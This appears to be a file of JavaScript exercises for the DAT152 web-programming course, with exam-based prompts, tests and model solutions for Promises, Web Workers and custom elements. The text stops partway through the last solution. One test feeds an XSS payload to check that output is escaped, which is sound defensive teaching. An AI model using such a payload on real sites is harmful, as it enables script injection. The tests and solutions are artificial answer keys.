/* Kodeøvinger.
   type "js"        : koden kjøres i en sandkasse-iframe og testes automatisk
   type "rubric"    : koden sjekkes mot en sjekkliste (regex), slik sensor leter etter nøkkelelementer
   type "endpoints" : fyll ut endepunkt-tabellen
*/
window.DAT = window.DAT || {};
DAT.exercises = DAT.exercises || [];

/* ============================ JAVASCRIPT (kjørbare) ============================ */

DAT.exercises.push({
  id: "js-promise",
  area: "js",
  type: "js",
  level: 1,
  title: "Promise som resolves av asynkron kode",
  source: "Eksamen v26 5b, h23 6a iii",
  prompt: `<p>Skriv funksjonen <code>waitforSomething()</code> som returnerer en <b>Promise</b>. Promisen skal resolves av <b>asynkron kode</b> (f.eks. <code>setTimeout</code>) med verdien <code>"DAT152"</code>.</p>
<p class="small muted">Sensor h23: trekk hvis Promisen ikke inkluderer asynkron kode.</p>`,
  starter: `function waitforSomething() {
    // return a Promise that is resolved later by asynchronous code

}
`,
  tests: `
test("Returnerer en Promise", async () => {
  const p = waitforSomething();
  assert(p && typeof p.then === "function", "waitforSomething() må returnere en Promise");
});
test("Resolves av asynkron kode (ikke umiddelbart)", async () => {
  let settled = false;
  waitforSomething().then(() => settled = true, () => settled = true);
  await Promise.resolve(); await Promise.resolve(); await Promise.resolve();
  assert(!settled, "Promisen ble avgjort med en gang. Bruk f.eks. setTimeout(() => resolve(...), 500)");
});
test("Resolves med verdien \\"DAT152\\"", async () => {
  const v = await waitforSomething();
  assert(v === "DAT152", "Fikk " + JSON.stringify(v) + ", forventet \\"DAT152\\"");
});
`,
  solution: `function waitforSomething() {
    return new Promise((resolve, reject) => {
        setTimeout(() => resolve("DAT152"), 500);
    });
}

// Using it:
async function myFunction() {
    try {
        const answer = await waitforSomething();
        console.log(\`Resolved with value "\${answer}"\`);
    } catch (e) {
        console.log(\`Rejected with "\${e.message}"\`);
    }
}
myFunction();
`
});

DAT.exercises.push({
  id: "js-worker",
  area: "js",
  type: "js",
  level: 1,
  worker: true,
  title: "Web Worker: «Welcome to DAT152»",
  source: "Eksamen v26 5a",
  prompt: `<p>Hovedtråden skal lage en worker-tråd som produserer teksten <code>"Welcome to DAT152"</code>. Hovedtråden skal så vise teksten i konsollen (<code>console.log</code>).</p>
<p>Skriv koden for både hovedtråden og workeren. Behold de to markør-kommentarene – alt under <code>// === worker.js ===</code> blir worker-filen. Bruk <code>new Worker("worker.js")</code>.</p>`,
  starter: `// === main.js ===


// === worker.js ===

`,
  tests: `
test("Hovedtråden lager en Worker", async () => {
  await sleep(50);
  assert(__workers.length > 0, "Fant ingen 'new Worker(...)' i main.js");
});
test("Workeren bruker ikke DOM", async () => {
  assert(!/\\bdocument\\b|\\bwindow\\./.test(__workerCode), "En worker har ikke tilgang til document/window");
});
test("Teksten vises i konsollen av hovedtråden", async () => {
  await sleep(600);
  assert(__logs.some(l => l.includes("Welcome to DAT152")), "Fant ikke 'Welcome to DAT152' i console.log fra hovedtråden");
});
`,
  solution: `// === main.js ===
const worker = new Worker("worker.js");
worker.addEventListener("message", (event) => {
    console.log(event.data);
});
worker.postMessage("start");

// === worker.js ===
self.addEventListener("message", (event) => {
    self.postMessage("Welcome to DAT152");
});
`
});

DAT.exercises.push({
  id: "js-messagelist",
  area: "js",
  type: "js",
  level: 3,
  title: "MessageList-komponenten (10 %-oppgaven)",
  source: "Eksamen h25 5f",
  prompt: `<p>Komponenten <code>&lt;message-list&gt;</code> har to offentlige metoder:</p>
<ul>
<li><code>show(message)</code> – viser en melding <b>øverst</b> i listen. <code>message = { id: 3, author: "Gro", text: "I am missing a chair in my office" }</code>. <code>id</code> lagres som data-attributtet <code>data-id</code>.</li>
<li><code>remove(id)</code> – fjerner meldingen med gitt id.</li>
</ul>
<p>Bruk de oppgitte templatene <code>listtemplate</code> og <code>messagetemplate</code> (sensor trekker hvis ikke).</p>`,
  starter: `const listtemplate = document.createElement("template");
listtemplate.innerHTML = '<div id="list"></div>';

const messagetemplate = document.createElement("template");
messagetemplate.innerHTML = \`
    <div class="message">
        <div class="author"></div>
        <div class="text"></div>
    </div>\`;

class MessageList extends HTMLElement {
    #shadow;

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = listtemplate.content.cloneNode(true);
        this.#shadow.appendChild(content);
        // More code, if necessary
    }

    show(message) {
        // Code of method show()
    }

    remove(id) {
        // Code of method remove()
    }
}
customElements.define('message-list', MessageList);
`,
  tests: `
const ml = document.createElement("message-list");
document.body.append(ml);
test("show() legger til en melding med forfatter og tekst", async () => {
  ml.show({ id: 1, author: "Ola", text: "Lunch at 12?" });
  const root = shadowOf(ml);
  const msg = root.querySelector(".message");
  assert(msg, "Fant ingen .message – bruker du messagetemplate?");
  assert(root.querySelector(".author").textContent.trim() === "Ola", "Forfatteren vises ikke i .author");
  assert(root.querySelector(".text").textContent.trim() === "Lunch at 12?", "Teksten vises ikke i .text");
});
test("Meldingen lagres med data-id", async () => {
  const root = shadowOf(ml);
  assert(root.querySelector('[data-id="1"]'), "Fant ikke element med data-id=\\"1\\" (bruk element.dataset.id = message.id)");
});
test("Ny melding vises ØVERST", async () => {
  ml.show({ id: 3, author: "Gro", text: "I am missing a chair in my office" });
  const root = shadowOf(ml);
  const first = root.querySelector("#list").firstElementChild;
  assert(first && first.dataset.id === "3", "Første element i #list skal være meldingen med id 3 (bruk prepend / insertBefore)");
  assert(root.querySelectorAll(".message").length === 2, "Det skal være 2 meldinger");
});
test("remove(id) fjerner riktig melding", async () => {
  ml.remove(1);
  const root = shadowOf(ml);
  assert(!root.querySelector('[data-id="1"]'), "Meldingen med id 1 finnes fortsatt");
  assert(root.querySelector('[data-id="3"]'), "Feil melding ble fjernet");
});
test("remove() med ukjent id krasjer ikke", async () => {
  ml.remove(999);
});
test("XSS-sikker: tekst settes med textContent", async () => {
  ml.show({ id: 9, author: "<img src=x onerror=window.__pwned=1>", text: "<b>bold?</b>" });
  await sleep(100);
  const root = shadowOf(ml);
  assert(!root.querySelector("img") && !root.querySelector("b"), "HTML i meldingen ble tolket som kode – bruk textContent, ikke innerHTML");
  assert(!window.__pwned, "XSS-payloaden kjørte!");
});
`,
  solution: `const listtemplate = document.createElement("template");
listtemplate.innerHTML = '<div id="list"></div>';

const messagetemplate = document.createElement("template");
messagetemplate.innerHTML = \`
    <div class="message">
        <div class="author"></div>
        <div class="text"></div>
    </div>\`;

class MessageList extends HTMLElement {
    #shadow;
    #list;

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = listtemplate.content.cloneNode(true);
        this.#shadow.appendChild(content);
        this.#list = this.#shadow.getElementById("list");
    }

    show(message) {
        const content = messagetemplate.content.cloneNode(true);
        const messageElm = content.firstElementChild;
        messageElm.dataset.id = message.id;
        messageElm.querySelector(".author").textContent = message.author;
        messageElm.querySelector(".text").textContent = message.text;
        this.#list.insertBefore(messageElm, this.#list.firstElementChild);
        // or: this.#list.prepend(messageElm);
    }

    remove(id) {
        const messageElm = this.#list.querySelector(\`[data-id="\${id}"]\`);
        if (messageElm !== null) {
            messageElm.remove();
        }
    }
}
customElements.define('message-list', MessageList);
`
});

DAT.exercises.push({
  id: "js-quiztool",
  area: "js",
  type: "js",
  level: 3,
  title: "QuizTool – fetch spørsmål og antall",
  source: "Eksamen v26 5f",
  prompt: `<p>Når komponenten <b>monteres</b> (legges i DOM-en) skal den:</p>
<ul><li>hente antall spørsmål fra <code>GET ../api/count</code> → <code>{"count":30,"responseStatus":true}</code> og vise det i <code>#count</code>,</li>
<li>hente første spørsmål fra <code>GET ../api/next?id=0</code> → <code>{"question":{"id":7,"text":"…"},"responseStatus":true}</code>, vise teksten i andre <code>&lt;p&gt;</code> i <code>#question</code> og sette <code>#number</code> til 1.</li></ul>
<p>Ved klikk på <b>Next question</b>: hent neste spørsmål med <code>id</code> = id-en til gjeldende spørsmål, vis det og øk nummeret med 1.</p>
<p class="small muted">fetch er mocket i testene – samme svar som i oppgaveteksten.</p>`,
  starter: `const template = document.createElement("template");
template.innerHTML = \`
    <fieldset id="top">
        <legend>
            Question <span id="number"></span> of
            <span id="count"></span>
        </legend>
        <div id="question">
            <p>Question:</p>
            <p></p>
        </div>
        <form>
            <div id="answerbox">
                <input type="text" name="answer">
            </div>
            <div id="buttons">
                <button type="button">Check answer</button>
                <button type="button">Next question</button>
            </div>
        </form>
    </fieldset>\`;

class QuizTool extends HTMLElement {
    #shadow;
    #serviceurl = "../api";
    // More fields

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        this.#shadow.appendChild(content);
        // More code
    }

    // More methods
}
customElements.define('dat152-quiz', QuizTool);
`,
  tests: `
const calls = [];
const questions = { 0: { id: 7, text: "What is the name of the highest mountain in Norway?" },
                    7: { id: 12, text: "What is the capital of Norway?" },
                    12: { id: 20, text: "Which year was HVL founded?" } };
mockFetch((url) => {
  calls.push(url);
  if (/api\\/count/.test(url)) return jsonResponse({ count: 30, responseStatus: true });
  const m = /api\\/next\\?id=(\\d+)/.exec(url);
  if (m) {
    const q = questions[m[1]];
    return jsonResponse(q ? { question: q, responseStatus: true } : { responseStatus: false });
  }
  return jsonResponse({ responseStatus: false }, 404);
});
const quiz = document.createElement("dat152-quiz");
document.body.append(quiz);
const root = () => shadowOf(quiz);
const qtext = () => root().querySelector("#question").textContent;
test("Henter count og viser 30 i #count", async () => {
  await sleep(300);
  assert(calls.some(u => /api\\/count/.test(u)), "Ingen fetch mot ../api/count");
  assert(root().querySelector("#count").textContent.trim() === "30", "#count viser ikke 30");
});
test("Henter første spørsmål med id=0 og viser det", async () => {
  assert(calls.some(u => /api\\/next\\?id=0\\b/.test(u)), "Ingen fetch mot ../api/next?id=0");
  assert(qtext().includes("highest mountain"), "Spørsmålsteksten vises ikke i #question");
});
test("#number viser 1", async () => {
  assert(root().querySelector("#number").textContent.trim() === "1", "#number skal være 1");
});
test("Next question henter id=7 og viser neste spørsmål", async () => {
  const input = root().querySelector("input");
  if (input) input.value = "Galdhøpiggen";
  const btn = [...root().querySelectorAll("#buttons button")].find(b => /next/i.test(b.textContent));
  btn.click();
  await sleep(300);
  assert(calls.some(u => /api\\/next\\?id=7\\b/.test(u)), "Neste fetch skal bruke id=7 (id-en til gjeldende spørsmål, ikke nummeret)");
  assert(qtext().includes("capital of Norway"), "Nytt spørsmål vises ikke");
  assert(root().querySelector("#number").textContent.trim() === "2", "#number skal nå være 2");
});
test("Forrige svar er fjernet fra visningen", async () => {
  const input = root().querySelector("input");
  assert(!input || input.value === "", "Svarfeltet er ikke tømt (f.eks. form.reset())");
});
test("Spørsmålsteksten erstattes (ikke legges til)", async () => {
  assert(!qtext().includes("highest mountain"), "Gammelt spørsmål vises fortsatt – bruk textContent = …");
});
`,
  solution: `const template = document.createElement("template");
template.innerHTML = \`
    <fieldset id="top">
        <legend>
            Question <span id="number"></span> of
            <span id="count"></span>
        </legend>
        <div id="question">
            <p>Question:</p>
            <p></p>
        </div>
        <form>
            <div id="answerbox">
                <input type="text" name="answer">
            </div>
            <div id="buttons">
                <button type="button">Check answer</button>
                <button type="button">Next question</button>
            </div>
        </form>
    </fieldset>\`;

class QuizTool extends HTMLElement {
    #shadow;
    #serviceurl = "../api";
    #questionId = 0;        // id of the current question (0 = before the first)
    #number = 0;            // question number shown to the user
    #numberElm;
    #countElm;
    #questionElm;
    #form;

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        this.#shadow.appendChild(content);

        this.#numberElm = this.#shadow.getElementById("number");
        this.#countElm = this.#shadow.getElementById("count");
        this.#questionElm = this.#shadow.querySelector("#question p:last-of-type");
        this.#form = this.#shadow.querySelector("form");

        const buttons = this.#shadow.querySelectorAll("#buttons button");
        buttons[1].addEventListener("click", () => this.#nextQuestion());
    }

    connectedCallback() {
        this.#fetchCount();
        this.#nextQuestion();
    }

    async #fetchCount() {
        try {
            const response = await fetch(\`\${this.#serviceurl}/count\`, { method: "GET" });
            try {
                const countResponse = await response.json();
                if (countResponse.responseStatus) {
                    this.#countElm.textContent = countResponse.count;
                }
            } catch (error) {
                console.log("Invalid JSON from server");
            }
        } catch (error) {
            console.log("Could not connect to server");
        }
    }

    async #nextQuestion() {
        try {
            const url = \`\${this.#serviceurl}/next?id=\${this.#questionId}\`;
            const response = await fetch(url, { method: "GET" });
            const result = await response.json();
            if (result.responseStatus) {
                this.#form.reset();                         // clear previous answer
                this.#questionId = result.question.id;
                this.#questionElm.textContent = result.question.text;
                this.#number++;
                this.#numberElm.textContent = this.#number;
            }
        } catch (error) {
            console.log(error.message);
        }
    }
}
customElements.define('dat152-quiz', QuizTool);
`
});

DAT.exercises.push({
  id: "js-shoppinglist",
  area: "js",
  type: "js",
  level: 3,
  title: "ShoppingList – sortert tabell med callbacks",
  source: "Eksamen h24 6b",
  prompt: `<p>Implementer <code>additem(item)</code>, <code>removeitem(id)</code> og <code>addremoveitemcallback(callback)</code>.</p>
<ul>
<li><code>item = { id: 1, name: "Bananas", amount: "2 kg", deadline: new Date(2024,10,30,12,23) }</code></li>
<li>Listen skal være <b>sortert på deadline</b>, korteste øverst.</li>
<li>Deadline-tekst: <code>item.deadline.toLocaleDateString(navigator.language, { weekday: "long", dayPeriod: "long" })</code></li>
<li>Klikk på <b>Remove</b> skal kjøre callbackene med <code>id</code> – men <b>ikke</b> fjerne raden selv (forelderen kaller <code>removeitem</code> hvis sletting på server lyktes).</li>
<li>Samme id to ganger skal ikke gi to rader.</li>
</ul>`,
  starter: `const template = document.createElement("template");
template.innerHTML = \`
    <table id="shoppinglist">
        <thead>
            <tr><th>Item</th><th>Amount</th><th>Deadline</th></tr>
        </thead>
        <tbody></tbody>
    </table>\`;

const itemrow = document.createElement("template");
itemrow.innerHTML = \`
    <tr>
        <td></td>
        <td></td>
        <td></td>
        <td><button type="button">Remove</button></td>
    </tr>\`;

class ShoppingList extends HTMLElement {
    // Add the necessary private fields

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        // More code, if necessary
    }

    addremoveitemcallback(callback) {
        // More code
    }

    additem(item) {
        // More code
    }

    removeitem(id) {
        // More code
    }
}
customElements.define('shopping-list', ShoppingList);
`,
  tests: `
const sl = document.createElement("shopping-list");
document.body.append(sl);
const rows = () => [...shadowOf(sl).querySelector("tbody").rows];
const names = () => rows().map(r => r.cells[0].textContent.trim());
test("additem legger til en rad med navn og mengde", async () => {
  sl.additem({ id: 1, name: "Bananas", amount: "2 kg", deadline: new Date(2024, 10, 30, 12, 23) });
  assert(rows().length === 1, "Forventet 1 rad i tbody");
  assert(rows()[0].cells[0].textContent.trim() === "Bananas", "Navn i første celle");
  assert(rows()[0].cells[1].textContent.trim() === "2 kg", "Mengde i andre celle");
  assert(rows()[0].cells[2].textContent.trim().length > 0, "Deadline-tekst mangler i tredje celle");
});
test("Sortert på deadline (korteste øverst)", async () => {
  sl.additem({ id: 2, name: "Milk", amount: "1 l", deadline: new Date(2024, 11, 5, 9, 0) });
  sl.additem({ id: 3, name: "Apples", amount: "6", deadline: new Date(2024, 10, 20, 8, 0) });
  sl.additem({ id: 4, name: "Bread", amount: "1", deadline: new Date(2024, 10, 25, 8, 0) });
  const n = names().join(", ");
  assert(n === "Apples, Bread, Bananas, Milk", "Rekkefølgen ble: " + n);
});
test("Samme id gir ikke duplikat", async () => {
  sl.additem({ id: 1, name: "Bananas", amount: "2 kg", deadline: new Date(2024, 10, 30, 12, 23) });
  assert(rows().length === 4, "Det ble lagt til duplikat");
});
test("Klikk på Remove kjører callback med id (og fjerner ikke raden selv)", async () => {
  const got = [];
  sl.addremoveitemcallback(id => got.push(id));
  const row = rows().find(r => r.cells[0].textContent.trim() === "Milk");
  row.querySelector("button").click();
  await sleep(20);
  assert(got.length === 1 && String(got[0]) === "2", "Callback ble kalt med: " + JSON.stringify(got));
  assert(rows().length === 4, "Raden skal ikke fjernes av klikket – bare av removeitem()");
});
test("removeitem(id) fjerner riktig rad", async () => {
  sl.removeitem(2);
  assert(!names().includes("Milk"), "Milk finnes fortsatt");
  assert(rows().length === 3, "Feil antall rader etter fjerning");
});
`,
  solution: `const template = document.createElement("template");
template.innerHTML = \`
    <table id="shoppinglist">
        <thead>
            <tr><th>Item</th><th>Amount</th><th>Deadline</th></tr>
        </thead>
        <tbody></tbody>
    </table>\`;

const itemrow = document.createElement("template");
itemrow.innerHTML = \`
    <tr>
        <td></td>
        <td></td>
        <td></td>
        <td><button type="button">Remove</button></td>
    </tr>\`;

class ShoppingList extends HTMLElement {
    #callbacks = new Map();
    #shoppinglist;

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        this.#shoppinglist = shadow.getElementById("shoppinglist").tBodies[0];
    }

    addremoveitemcallback(callback) {
        const callbackid = Symbol("removeitemcallback");
        this.#callbacks.set(callbackid, callback);
        return callbackid;
    }

    additem(item) {
        if (this.#shoppinglist.querySelector(\`tr[data-id="\${item.id}"]\`) !== null) {
            return;                                   // already listed
        }
        const row = itemrow.content.cloneNode(true).firstElementChild;
        row.dataset.id = item.id;
        row.dataset.time = item.deadline.getTime();
        row.cells[0].textContent = item.name;
        row.cells[1].textContent = item.amount;
        row.cells[2].textContent = item.deadline.toLocaleDateString(
            navigator.language, { weekday: "long", dayPeriod: "long" });
        row.querySelector("button").addEventListener("click",
            () => this.#onremove(item.id));

        // first row with a later deadline -> insert before it
        const later = Array.from(this.#shoppinglist.rows)
            .find(r => Number(r.dataset.time) > item.deadline.getTime());
        this.#shoppinglist.insertBefore(row, later ?? null);
    }

    removeitem(id) {
        const row = this.#shoppinglist.querySelector(\`tr[data-id="\${id}"]\`);
        if (row !== null) {
            row.remove();
        }
    }

    #onremove(id) {
        this.#callbacks.forEach(callback => callback(id));
    }
}
customElements.define('shopping-list', ShoppingList);
`
});

DAT.exercises.push({
  id: "js-productinfo",
  area: "js",
  type: "js",
  level: 2,
  title: "ProductInfo – inputs, status og callback",
  source: "Eksamen v24 6b",
  prompt: `<p>Implementer de offentlige metodene:</p>
<ul><li><code>clear()</code> – setter input-feltene til tom streng.</li>
<li><code>showmessage(message)</code> – viser teksten i <code>&lt;span&gt;</code> i <code>.message</code>.</li>
<li><code>setproductcallback(callback)</code> – callback kjøres ved klikk på <b>Add product</b> med <code>{ item, price }</code> fra input-feltene.</li></ul>`,
  starter: `const template = document.createElement("template");
template.innerHTML = \`
    <fieldset>
        <legend>Fill in product information</legend>
        <div class="product">
            <input type="text" name="item" size="15" placeholder="Product name" required>
            <input type="text" name="price" size="4" placeholder="Price" required>
            <button>Add product</button>
        </div>
        <div class="message">Status: <span></span></div>
    </fieldset>\`;

class ProductInfo extends HTMLElement {
    // Add the necessary private fields

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        // More code
    }

    // More code
}
customElements.define('product-info', ProductInfo);
`,
  tests: `
const pi = document.createElement("product-info");
document.body.append(pi);
const r = () => shadowOf(pi);
test("showmessage viser tekst i .message span", async () => {
  pi.showmessage('Data for "Umbrella" was saved');
  assert(r().querySelector(".message span").textContent === 'Data for "Umbrella" was saved', "Feil tekst i span");
});
test("Klikk på Add product kjører callback med {item, price}", async () => {
  const got = [];
  pi.setproductcallback(p => got.push(p));
  r().querySelector("input[name=item]").value = "Umbrella";
  r().querySelector("input[name=price]").value = "123";
  r().querySelector("button").click();
  await sleep(20);
  assert(got.length === 1, "Callback ble kalt " + got.length + " ganger");
  assert(got[0].item === "Umbrella" && String(got[0].price) === "123", "Fikk " + JSON.stringify(got[0]));
});
test("clear() tømmer input-feltene", async () => {
  pi.clear();
  assert(r().querySelector("input[name=item]").value === "" && r().querySelector("input[name=price]").value === "", "Feltene er ikke tomme");
});
test("Flere callbacks støttes", async () => {
  let a = 0, b = 0;
  pi.setproductcallback(() => a++);
  pi.setproductcallback(() => b++);
  r().querySelector("input[name=item]").value = "Hat";
  r().querySelector("input[name=price]").value = "50";
  r().querySelector("button").click();
  await sleep(20);
  assert(a === 1 && b === 1, "Ikke alle callbacks ble kjørt");
});
`,
  solution: `const template = document.createElement("template");
template.innerHTML = \`
    <fieldset>
        <legend>Fill in product information</legend>
        <div class="product">
            <input type="text" name="item" size="15" placeholder="Product name" required>
            <input type="text" name="price" size="4" placeholder="Price" required>
            <button>Add product</button>
        </div>
        <div class="message">Status: <span></span></div>
    </fieldset>\`;

class ProductInfo extends HTMLElement {
    #callbacks = new Map();
    #iteminput;
    #priceinput;
    #messageElement;

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        shadow.querySelector("button").addEventListener("click", () => this.#addproduct());
        this.#iteminput = shadow.querySelector("input[name='item']");
        this.#priceinput = shadow.querySelector("input[name='price']");
        this.#messageElement = shadow.querySelector(".message > span");
    }

    clear() {
        this.#iteminput.value = "";
        this.#priceinput.value = "";
        this.showmessage("");
    }

    setproductcallback(callback) {
        const callbackid = Symbol("productCallback");
        this.#callbacks.set(callbackid, callback);
        return callbackid;
    }

    showmessage(message) {
        this.#messageElement.textContent = message;
    }

    #addproduct() {
        const item = this.#iteminput.value.trim();
        const price = this.#priceinput.value.trim();
        if (item === "" || price === "") return;
        const product = { item: item, price: price };
        this.#callbacks.forEach(callback => callback(product));
    }
}
customElements.define('product-info', ProductInfo);
`
});

DAT.exercises.push({
  id: "js-storagemanager",
  area: "js",
  type: "js",
  level: 3,
  title: "StorageManager – forelder som bruker ProductInfo",
  source: "Eksamen v24 6c",
  prompt: `<p><code>ProductInfo</code> fra forrige oppgave er allerede definert (skjult). Lag forelder-komponenten <code>&lt;storage-manager&gt;</code> som:</p>
<ol><li>inneholder <code>&lt;product-info&gt;</code> i sin shadow DOM,</li>
<li>registrerer en callback; ved klikk sendes produktet til serveren via <code>#storeOnServer(product)</code>,</li>
<li>viser <code>Data for "Umbrella" was saved</code> ved suksess (og tømmer feltene), eller <code>Failed to save data for "Umbrella"</code> hvis <code>reponsestatus</code> er false eller Promisen rejecter.</li></ol>
<p><code>#storeOnServer</code> skal du her implementere med <code>fetch("../api/products", { method: "POST", … })</code> som returnerer en Promise med <code>{ reponsestatus, product }</code> (mocket i testen).</p>`,
  setup: `const pitemplate = document.createElement("template");
pitemplate.innerHTML = '<fieldset><div class="product"><input type="text" name="item"><input type="text" name="price"><button>Add product</button></div><div class="message">Status: <span></span></div></fieldset>';
class ProductInfo extends HTMLElement {
  #cb = new Map(); #i; #p; #m;
  constructor() { super(); const s = this.attachShadow({ mode: 'closed' }); s.append(pitemplate.content.cloneNode(true));
    s.querySelector("button").addEventListener("click", () => { const item = this.#i.value.trim(), price = this.#p.value.trim(); if (!item || !price) return; this.#cb.forEach(c => c({ item, price })); });
    this.#i = s.querySelector("input[name=item]"); this.#p = s.querySelector("input[name=price]"); this.#m = s.querySelector(".message span"); }
  clear() { this.#i.value = ""; this.#p.value = ""; this.showmessage(""); }
  setproductcallback(c) { const id = Symbol(); this.#cb.set(id, c); return id; }
  showmessage(m) { this.#m.textContent = m; }
}
customElements.define('product-info', ProductInfo);`,
  starter: `const template = document.createElement("template");
template.innerHTML = "<product-info></product-info>";

class StorageManager extends HTMLElement {
    // private fields

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        // More code
    }

    // #saveproduct(product) ...

    #storeOnServer(product) {
        // return a Promise resolving to { reponsestatus, product }
    }
}
customElements.define('storage-manager', StorageManager);
`,
  tests: `
let fail = false;
mockFetch(async (url, opts) => {
  const body = opts && opts.body ? JSON.parse(opts.body) : null;
  return jsonResponse({ reponsestatus: !fail, product: body });
});
document.body.insertAdjacentHTML("beforeend", "<storage-manager></storage-manager>");
const sm = document.querySelector("storage-manager");
const pi = () => shadowOf(sm).querySelector("product-info");
const pr = () => shadowOf(pi());
test("Inneholder <product-info>", async () => {
  assert(pi(), "Fant ikke product-info i shadow DOM");
});
test("Lagring OK → suksessmelding og tomme felt", async () => {
  pr().querySelector("input[name=item]").value = "Umbrella";
  pr().querySelector("input[name=price]").value = "123";
  pr().querySelector("button").click();
  await sleep(300);
  const msg = pr().querySelector(".message span").textContent;
  assert(/saved/i.test(msg) && msg.includes("Umbrella"), "Melding var: " + JSON.stringify(msg));
  assert(pr().querySelector("input[name=item]").value === "", "Feltene ble ikke tømt (kall clear())");
});
test("reponsestatus false → feilmelding", async () => {
  fail = true;
  pr().querySelector("input[name=item]").value = "Hat";
  pr().querySelector("input[name=price]").value = "50";
  pr().querySelector("button").click();
  await sleep(300);
  const msg = pr().querySelector(".message span").textContent;
  assert(/fail/i.test(msg) && msg.includes("Hat"), "Melding var: " + JSON.stringify(msg));
});
test("Nettverksfeil (reject) → feilmelding", async () => {
  mockFetch(async () => { throw new TypeError("Failed to fetch"); });
  pr().querySelector("input[name=item]").value = "Cap";
  pr().querySelector("input[name=price]").value = "10";
  pr().querySelector("button").click();
  await sleep(300);
  const msg = pr().querySelector(".message span").textContent;
  assert(/fail/i.test(msg) && msg.includes("Cap"), "Ingen feilmelding ved reject: " + JSON.stringify(msg));
});
`,
  solution: `const template = document.createElement("template");
template.innerHTML = "<product-info></product-info>";

class StorageManager extends HTMLElement {
    #pinfo;

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        this.#pinfo = shadow.querySelector("product-info");
        customElements.upgrade(this.#pinfo);   // safe even if this element is not in the DOM yet
        this.#pinfo.setproductcallback((product) => this.#saveproduct(product));
    }

    async #saveproduct(product) {
        try {
            const result = await this.#storeOnServer(product);
            if (result.reponsestatus) {
                this.#pinfo.clear();
                this.#pinfo.showmessage(\`Data for "\${product.item}" was saved\`);
            } else {
                this.#pinfo.showmessage(\`Failed to save data for "\${product.item}"\`);
            }
        } catch (error) {
            this.#pinfo.showmessage(\`Failed to save data for "\${product.item}"\`);
        }
    }

    async #storeOnServer(product) {
        const response = await fetch("../api/products", {
            method: "POST",
            headers: { "Content-Type": "application/json; charset=utf-8" },
            body: JSON.stringify(product)
        });
        return response.json();
    }
}
customElements.define('storage-manager', StorageManager);
`
});

DAT.exercises.push({
  id: "js-examlist",
  area: "js",
  type: "js",
  level: 3,
  title: "ExamList – legg til eller oppdater, update-callback",
  source: "Eksamen h23 6c",
  prompt: `<p>Skriv <code>ExamList</code> (<code>&lt;exam-list&gt;</code>) med offentlige metoder:</p>
<ul><li><code>addExam(examdata)</code> – <code>{ code: "DAT152", date: "2023-12-11" }</code>. Finnes ikke koden: ny rad <b>nederst</b>. Finnes den: oppdater bare datoen.</li>
<li><code>examupdateCallback(callback)</code> – callback kjøres ved klikk på en <b>Update</b>-knapp med examdata for den raden (med gjeldende dato).</li></ul>
<p>Tabellen (<code>examtable</code>) legges inn i <code>#examlist</code>.</p>`,
  starter: `const template = document.createElement("template");
template.innerHTML = '<div id="examlist"></div>';

const examtable = document.createElement("template");
examtable.innerHTML = \`
    <table>
        <thead><tr><th>Course</th><th>Exam date</th></tr></thead>
        <tbody></tbody>
    </table>\`;

const examrow = document.createElement("template");
examrow.innerHTML = \`
    <tr>
        <td></td>
        <td></td>
        <td><button type="button">Update</button></td>
    </tr>\`;

class ExamList extends HTMLElement {

}
customElements.define('exam-list', ExamList);
`,
  tests: `
const el = document.createElement("exam-list");
document.body.append(el);
const rows = () => [...shadowOf(el).querySelectorAll("#examlist tbody tr")];
test("addExam legger til rad i tabellen inne i #examlist", async () => {
  el.addExam({ code: "DAT152", date: "2023-12-11" });
  assert(rows().length === 1, "Forventet 1 rad i #examlist tbody");
  assert(rows()[0].cells[0].textContent.trim() === "DAT152" && rows()[0].cells[1].textContent.trim() === "2023-12-11", "Feil innhold i cellene");
});
test("Ny kode legges nederst", async () => {
  el.addExam({ code: "DAT151", date: "2023-12-05" });
  assert(rows().length === 2 && rows()[1].cells[0].textContent.trim() === "DAT151", "DAT151 skal være siste rad");
});
test("Eksisterende kode oppdaterer dato (ingen ny rad)", async () => {
  el.addExam({ code: "DAT152", date: "2023-12-12" });
  assert(rows().length === 2, "Det ble laget en ny rad");
  assert(rows()[0].cells[1].textContent.trim() === "2023-12-12", "Datoen ble ikke oppdatert");
});
test("Update-knapp kjører callback med {code, date}", async () => {
  const got = [];
  el.examupdateCallback(d => got.push(d));
  rows()[0].querySelector("button").click();
  await sleep(20);
  assert(got.length === 1 && got[0].code === "DAT152" && got[0].date === "2023-12-12", "Fikk " + JSON.stringify(got));
});
`,
  solution: `const template = document.createElement("template");
template.innerHTML = '<div id="examlist"></div>';

const examtable = document.createElement("template");
examtable.innerHTML = \`
    <table>
        <thead><tr><th>Course</th><th>Exam date</th></tr></thead>
        <tbody></tbody>
    </table>\`;

const examrow = document.createElement("template");
examrow.innerHTML = \`
    <tr>
        <td></td>
        <td></td>
        <td><button type="button">Update</button></td>
    </tr>\`;

class ExamList extends HTMLElement {
    #shadow;
    #tbody;
    #callbacks = new Map();

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        this.#shadow.append(template.content.cloneNode(true));
        const table = examtable.content.cloneNode(true);
        this.#shadow.getElementById("examlist").append(table);
        this.#tbody = this.#shadow.querySelector("tbody");
    }

    addExam(examdata) {
        let row = this.#tbody.querySelector(\`tr[data-code="\${examdata.code}"]\`);
        if (row === null) {
            row = examrow.content.cloneNode(true).firstElementChild;
            row.dataset.code = examdata.code;
            row.cells[0].textContent = examdata.code;
            row.querySelector("button").addEventListener("click", () => {
                this.#onupdate(examdata.code);
            });
            this.#tbody.append(row);
        }
        row.dataset.date = examdata.date;
